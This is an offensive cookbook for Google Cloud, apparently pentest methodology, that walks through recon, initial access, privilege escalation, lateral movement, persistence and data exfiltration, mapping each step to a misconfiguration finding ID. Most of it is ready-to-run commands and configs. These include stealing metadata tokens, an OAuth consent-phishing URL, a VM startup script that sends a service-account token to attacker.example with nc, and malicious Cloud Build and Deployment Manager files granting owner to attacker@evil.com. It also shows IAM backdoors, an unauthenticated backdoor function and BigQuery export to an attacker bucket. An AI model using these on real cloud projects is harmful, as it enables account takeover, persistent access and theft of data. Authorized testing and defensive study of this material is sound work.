# GCP Cookbook

Kill-chain ordered. Conventions: `$PROJECT_ID` for the GCP project, `$ORG_ID` for the org, `$SA` for a service account email.

`gcloud` config:

```bash
gcloud config set project $PROJECT_ID
gcloud config list
gcloud auth list
```

---

## 1. Recon (unauthenticated)

### Project / customer identification

GCP project IDs are global. Names are often guessable: `companyname-prod`, `companyname-data`, `target-staging`. Cloud Storage bucket names give project hints (org-scoped buckets often inherit a prefix).

### Cloud Storage bucket enumeration

GCS buckets are globally unique like S3. Enumeration is unauthenticated.

```bash
# Bucket existence + access check (unauth)
for name in target target-prod target-backup target-data target-logs target-static; do
  curl -s -o /dev/null -w "%{http_code} %{url}\n" "https://storage.googleapis.com/$name/"
done
# 200 = listable, 403 = exists but private, 404 = does not exist

# GCPBucketBrute (with optional creds for permission check)
python3 gcpbucketbrute.py -k targetname -u   # unauthenticated only
python3 gcpbucketbrute.py -k targetname --file wordlist.txt
```

GCPBucketBrute also checks **per-bucket IAM permissions** with the `testIamPermissions` API — finds buckets where unauth `storage.objects.get`, `storage.buckets.setIamPolicy`, etc. are granted to `allUsers` / `allAuthenticatedUsers`. The latter (`allAuthenticatedUsers`) is the deadly one because any Google account counts.

```bash
# Direct test against a known bucket
curl "https://storage.googleapis.com/storage/v1/b/$BUCKET/iam/testPermissions?permissions=storage.objects.list&permissions=storage.objects.get&permissions=storage.buckets.setIamPolicy"
```

**Maps to:** F-GCP-STO-001 (public GCS buckets), F-GCP-STO-002 (allAuthenticatedUsers grants).

### Cloud Functions / Cloud Run discovery

Public Cloud Run URLs follow `https://<service>-<hash>-<region>.a.run.app`. Cloud Functions: `https://<region>-<project>.cloudfunctions.net/<name>`.

```bash
# Brute-force project IDs against Cloud Functions
for proj in target-prod target-staging target-dev; do
  curl -s -o /dev/null -w "%{http_code} %{url}\n" "https://us-central1-$proj.cloudfunctions.net/"
done

# Cloud Run is harder to enumerate without hash, but custom domains often map back
subfinder -d target.com -all | dnsx -cname -resp | grep -E 'run.app|cloudfunctions.net|appspot.com'
```

### Workspace / Cloud Identity enumeration

Cloud Identity is the directory backing Workspace. Cross-references:

```bash
# Confirm a domain is on Workspace (DNS-based)
dig +short MX target.com | head -1
# google.com hits = Workspace MX
# Or check SSO config
curl -s "https://www.google.com/a/$TARGET_DOMAIN/ServiceLogin"  # legacy but works

# UPN enumeration
# Google has hardened user enumeration significantly; legitimate paths are mostly
# closed. Workspace admin enumeration still possible via:
# - Public LDAP / SAML metadata
# - GitHub repos containing internal email examples
# - LinkedIn employee dumps + likely-name guessing
```

---

## 2. Initial access

### Leaked service account keys

The #1 initial access vector for GCP. SA keys are JSON files containing private keys. They're often committed to git, posted on Pastebin, or stuffed in container images.

```bash
# Find SA keys in a git repo
trufflehog git https://github.com/target/repo --json | jq 'select(.DetectorName == "GCPApplicationDefaultCredentials" or .DetectorName == "GCP")'
gitleaks detect --source . --report-format json

# Test a leaked SA key
gcloud auth activate-service-account --key-file=leaked-key.json
gcloud auth list
gcloud projects list
```

If the SA was deleted but the key wasn't rotated/removed from clients, the key fails. But if the SA exists and the key was never revoked: full access.

### Password spraying Workspace accounts

Google has aggressive captcha + step-up auth for password spraying. Most spraying gets caught. Vectors that bypass:

- IMAP / SMTP endpoints (if not migrated to OAuth-only).
- Older POP3 + app-specific passwords (legacy).
- The `accounts.google.com/_/signin/sl/challenge` flow has been hardened repeatedly.

```bash
# CredKing / GoMapEnum (limited success against modern Google)
# Better: focus on phishing + OAuth consent
```

### OAuth consent phishing on Workspace

Same idea as Entra. Attacker registers an app in their own GCP project, requests sensitive scopes (`gmail.readonly`, `drive.readonly`), tricks user into consent. Result: refresh token.

```bash
# Build consent URL
echo "https://accounts.google.com/o/oauth2/v2/auth?
client_id=$ATTACKER_CLIENT_ID&
redirect_uri=https://attacker.example/cb&
response_type=code&
scope=https://www.googleapis.com/auth/gmail.readonly%20https://www.googleapis.com/auth/drive.readonly&
access_type=offline&
prompt=consent"
```

Workspace admins should be restricting OAuth apps to allowlisted client IDs (admin.google.com → Security → API Controls). Default: anyone can grant any non-Google app any scope.

### Metadata SSRF on GCE / GKE / Cloud Run

```bash
# Classic IMDS-style attack — works on Compute Engine, Cloud Run jobs, GKE nodes
# Header required: Metadata-Flavor: Google
curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"
# Returns: access_token + expires_in + token_type

# List SAs available on this instance
curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" \
  -H "Metadata-Flavor: Google"

# Scopes the token can use
curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes" \
  -H "Metadata-Flavor: Google"

# Project metadata (often contains startup scripts, SSH keys, env vars)
curl -s "http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true" \
  -H "Metadata-Flavor: Google"
```

Note: GCE's metadata service requires the `Metadata-Flavor: Google` header by default (this protects against simple SSRF without header control). If the SSRF can set the header, or the host has legacy v1 metadata enabled, you win. Workload Identity in GKE replaces node SAs but the metadata server is still reachable from pods unless network policy blocks 169.254.169.254.

**Maps to:** F-GCP-COMP-001 (legacy metadata v1 enabled), F-GCP-GKE-001 (metadata accessible from pods without Workload Identity).

---

## 3. Enumeration (authenticated)

### gcloud project / org enumeration

```bash
# Identity check
gcloud auth list
gcloud config list
gcloud info

# What can I see?
gcloud projects list  # All projects you have at least browser on
gcloud organizations list
gcloud resource-manager folders list --organization $ORG_ID

# IAM policy of org / folder / project
gcloud organizations get-iam-policy $ORG_ID
gcloud resource-manager folders get-iam-policy $FOLDER_ID
gcloud projects get-iam-policy $PROJECT_ID

# All projects + their IAM policies (large org)
for p in $(gcloud projects list --format="value(projectId)"); do
  echo "=== $p ==="
  gcloud projects get-iam-policy $p
done
```

### Permission probing (the real enum tool)

`testIamPermissions` is the API call that tells you what you can do without trying it. Use it across every resource type.

```bash
# Test what I can do on a project
gcloud projects test-iam-permissions $PROJECT_ID --permissions "iam.serviceAccounts.actAs,iam.serviceAccounts.getAccessToken,resourcemanager.projects.setIamPolicy,storage.buckets.setIamPolicy"

# Same via REST
curl -s -X POST -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -H "Content-Type: application/json" \
  -d '{"permissions":["iam.serviceAccounts.actAs","resourcemanager.projects.setIamPolicy"]}' \
  "https://cloudresourcemanager.googleapis.com/v1/projects/$PROJECT_ID:testIamPermissions"
```

The enumerate-iam style approach: ship a brute permissions list, return only the ones that come back.

### Service account inventory

```bash
# All SAs in this project
gcloud iam service-accounts list --project $PROJECT_ID

# Keys for each SA (you need iam.serviceAccountKeys.list)
for sa in $(gcloud iam service-accounts list --project $PROJECT_ID --format="value(email)"); do
  echo "=== $sa ==="
  gcloud iam service-accounts keys list --iam-account=$sa
done

# Look for user-managed keys (these are the leak risk)
# Key type "USER_MANAGED" = customer-uploaded or generated key
# Key type "SYSTEM_MANAGED" = Google-managed (rotated automatically, can't be exfilled)
```

### GCPHound + manual graph

```bash
gcphound collect --org $ORG_ID --output gcp.json
gcphound graph --input gcp.json --output graph.json
# Visualize / query
```

The pattern to look for: a user (or another SA you control) with permission to impersonate (`iam.serviceAccounts.getAccessToken`, `iam.serviceAccounts.actAs`, or `iam.serviceAccounts.implicitDelegation`) a higher-privileged SA. That's almost always how GCP privesc happens.

**Maps to:** F-GCP-IAM-001 (broad project-level role grants), F-GCP-IAM-002 (user-managed SA keys not rotated), F-GCP-IAM-003 (overly permissive SA roles).

---

## 4. Privilege escalation

GCP has roughly 30 documented privesc paths, catalogued by Rhino Security Labs in [GCP-IAM-Privilege-Escalation](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation). The big ones:

### `iam.serviceAccounts.actAs` + ability to deploy a workload

You can run code as that SA. Examples:

- `iam.serviceAccounts.actAs` + `compute.instances.create` → create a VM with target SA attached → SSH in → grab token from metadata.
- `iam.serviceAccounts.actAs` + `cloudfunctions.functions.create` → deploy a function as the SA → it runs with the SA's permissions.
- `iam.serviceAccounts.actAs` + `cloudbuild.builds.create` → Cloud Build runs as the Cloud Build SA, often projects-level Editor.
- `iam.serviceAccounts.actAs` + `dataflow.jobs.create` → run a Dataflow job as the SA.
- `iam.serviceAccounts.actAs` + `deploymentmanager.deployments.create` → DM runs as the Google APIs SA, which is often projects-level Owner. **Critical**.

```bash
# Create a VM as the target SA
gcloud compute instances create privesc-vm \
  --zone=us-central1-a \
  --service-account=$TARGET_SA \
  --scopes=https://www.googleapis.com/auth/cloud-platform \
  --metadata=startup-script='#!/bin/bash
  curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
    -H "Metadata-Flavor: Google" | nc attacker.example 443'
```

### `iam.serviceAccountKeys.create`

Direct: create a new key for the target SA, walk away with it.

```bash
gcloud iam service-accounts keys create newkey.json --iam-account=$TARGET_SA
gcloud auth activate-service-account --key-file=newkey.json
```

### `iam.serviceAccounts.getAccessToken` / `signJwt` / `signBlob`

```bash
# Direct token impersonation
gcloud auth print-access-token --impersonate-service-account=$TARGET_SA

# Or via API
curl -X POST -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$TARGET_SA:generateAccessToken" \
  -H "Content-Type: application/json" \
  -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"3600s"}'
```

### `resourcemanager.projects.setIamPolicy`

If you have setIamPolicy on a project but no role above editor, you can grant yourself owner:

```bash
gcloud projects add-iam-policy-binding $PROJECT_ID \
  --member="user:attacker@evil.com" \
  --role="roles/owner"
```

This is the most-direct privesc and the most-monitored. Will generate an immediate Cloud Audit Log event.

### Cloud Build / Cloud Run service agent abuse

Both create per-project service agents like `<project_number>@cloudbuild.gserviceaccount.com` that often have `roles/editor`. If you can trigger a Cloud Build (e.g. push to a connected Cloud Source Repo, or trigger a build via API), and you control the build config (`cloudbuild.yaml`), you execute code as that SA.

```yaml
# Evil cloudbuild.yaml
steps:
- name: 'gcr.io/cloud-builders/gcloud'
  entrypoint: 'bash'
  args:
  - '-c'
  - |
    gcloud projects add-iam-policy-binding $PROJECT_ID \
      --member="user:attacker@evil.com" --role="roles/owner"
```

### IAM Recommender / `roles/iam.securityAdmin`

`iam.securityAdmin` looks innocuous (it's the role for managing IAM) but combined with no Conditions / no scoped bindings, it lets you modify any IAM policy in the project. Common over-grant for "DevOps" users.

### Deployment Manager (Google APIs SA)

Deployment Manager runs as the Google APIs Service Agent `<project_number>@cloudservices.gserviceaccount.com`. This SA has `roles/editor` on the project by default. If you can submit a deployment, that's editor on the whole project.

```yaml
# evil-deployment.yaml
resources:
- name: privesc
  type: gcp-types/cloudresourcemanager-v1:projects
  action: gcp-types/cloudresourcemanager-v1:cloudresourcemanager.projects.setIamPolicy
  properties:
    resource: $PROJECT_ID
    policy:
      bindings:
      - role: roles/owner
        members:
        - user:attacker@evil.com
```

```bash
gcloud deployment-manager deployments create evil-dep --config evil-deployment.yaml
```

**Maps to:** F-GCP-IAM-004 (SA impersonation paths exist), F-GCP-IAM-005 (Deployment Manager SA over-privileged), F-GCP-IAM-006 (Cloud Build SA holds editor with no source restrictions).

---

## 5. Lateral movement

### Cross-project SA impersonation

If a user has `iam.serviceAccounts.getAccessToken` on an SA in Project A, and that SA has `roles/owner` in Project B, the user has owner in Project B via impersonation.

```bash
# Map every SA's role bindings across every project
for proj in $(gcloud projects list --format="value(projectId)"); do
  echo "=== $proj ==="
  gcloud projects get-iam-policy $proj --format=json | \
    jq -r '.bindings[] | select(.members[] | contains("serviceAccount:")) | .role + " : " + (.members | join(","))'
done
```

Look for SAs from Project A appearing in Project B's IAM policy. Those are cross-project lateral paths.

### Workspace ↔ GCP — Domain-Wide Delegation

A service account with **domain-wide delegation** can impersonate any Workspace user. Workspace admin grants this via OAuth client ID + scope list. Often forgotten, sometimes wide-scope (e.g. `https://www.googleapis.com/auth/admin.directory.user`).

```bash
# Check if an SA has domain-wide delegation
gcloud iam service-accounts list --filter="email:$SA" --format="value(uniqueId)"
# Use the unique ID to check Workspace admin console (only admins can see this list)

# If you have a DWD-enabled SA key, you can impersonate any Workspace user
# Example using oauth2l or gcloud
oauth2l fetch --jwt --json sa-key.json --email victim@target.com \
  https://www.googleapis.com/auth/gmail.readonly
```

DWD is the most powerful Workspace lateral primitive. Defenders should be checking what's delegated and to whom.

### GKE — Workload Identity vs node SA

```bash
# Get cluster credentials (assumes IAM role on the cluster)
gcloud container clusters get-credentials $CLUSTER --zone $ZONE
kubectl auth can-i --list

# If Workload Identity is OFF, pods inherit the node's SA — often editor on the project
# If Workload Identity is ON, pods use a K8s SA → GCP SA mapping; less broad but check mappings

# Find KSAs mapped to GSAs
kubectl get serviceaccount -A -o json | jq '.items[] | select(.metadata.annotations."iam.gke.io/gcp-service-account") | {ns:.metadata.namespace, name:.metadata.name, gsa:.metadata.annotations."iam.gke.io/gcp-service-account"}'
```

If a pod with `cluster-admin` can write a new KSA → GSA mapping pointing at a high-privilege GSA, that's a lateral path through GKE.

### Cloud SQL

```bash
# Check for over-permissive SQL instance
gcloud sql instances list
gcloud sql instances describe $INSTANCE --format=json | jq '.settings.ipConfiguration'

# Authorized networks 0.0.0.0/0 → world-readable login surface
# requireSsl false → MITM-ready
```

**Maps to:** F-GCP-IAM-007 (cross-project SA bindings — lateral path), F-GCP-WS-001 (DWD service account with broad scope), F-GCP-GKE-002 (Workload Identity not enabled), F-GCP-SQL-001 (Cloud SQL public).

---

## 6. Persistence

### SA key creation

```bash
gcloud iam service-accounts keys create persistent.json --iam-account=$SA
# Default expiration: never (until rotated)
```

User-managed SA keys are the GCP equivalent of long-lived passwords. They don't rotate. They survive owner changes. They survive most IAM changes (except removing the SA itself or `serviceAccountKeyAdmin` on the SA).

### IAM policy backdoor

Adding yourself or an attacker-controlled account to project IAM policy.

```bash
gcloud projects add-iam-policy-binding $PROJECT_ID \
  --member="user:gardener@personal.example.com" \
  --role="roles/owner"
```

Detect via Cloud Audit Logs `SetIamPolicy` events on resourcemanager.

### Cloud Functions / Cloud Run backdoor

Deploy a function that runs as a high-privilege SA, callable from anywhere, doing whatever you want as that SA.

```bash
# Backdoor function
gcloud functions deploy bd --runtime=python311 --trigger-http --allow-unauthenticated \
  --service-account=$HIGH_PRIV_SA \
  --source=./backdoor --entry-point=main
```

### Workspace OAuth app persistence

Authorised OAuth apps with refresh tokens for victim accounts survive password changes (until admin revokes consent or user revokes via myaccount.google.com).

---

## 7. Data exfiltration

### GCS bulk download

```bash
gcloud storage cp gs://$BUCKET/* ./local --recursive
# Or use gsutil for parallel transfer
gsutil -m cp -r gs://$BUCKET ./local
```

### BigQuery exfil

```bash
# Find datasets you can query
bq ls --project_id=$PROJECT_ID
bq ls --datasets $PROJECT_ID

# Run a query, export the result
bq query --use_legacy_sql=false 'SELECT * FROM `proj.dataset.sensitive_table` LIMIT 1000000' > out.csv

# Or export the whole table to GCS, then download
bq extract --destination_format=CSV \
  'proj:dataset.sensitive' \
  'gs://attacker-bucket/exfil/sensitive-*.csv'
```

### Workspace mail / drive

If you have DWD or refresh token for a target user:

```bash
# Drive
gdrive list --query "starred = true or 'me' in owners" --owner $UPN
# Or via Drive API directly

# Gmail
# Use Gmail API; large mailbox → use batch API with takeout-style extract
```

### VPC SC bypass / egress monitoring

GCP has VPC Service Controls — perimeter around services that prevents data exfil even with valid IAM. When VPC SC is enforced, BigQuery / GCS calls from outside the perimeter fail. When not enforced (default for most projects), no such check.

```bash
gcloud access-context-manager perimeters list --policy=$POLICY_ID
```

No perimeters = no data exfil restrictions beyond IAM.

**Maps to:** F-GCP-LOG-001 (Cloud Audit Logs not retained ≥ 1 year), F-GCP-NET-001 (VPC Service Controls not deployed for sensitive projects), F-GCP-EXF-001 (no DLP scan on egress data).

---

## References

- [Rhino Security Labs — GCP IAM Privilege Escalation](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation)
- [HackingThe.Cloud — GCP section](https://hackingthe.cloud/gcp/general-knowledge/)
- [GCP Goat](https://github.com/ine-labs/GCPGoat)
- [Google's own attacker-perspective tooling](https://github.com/google/gcp_scanner)
- [MITRE ATT&CK for GCP](https://attack.mitre.org/matrices/enterprise/cloud/iaas/)
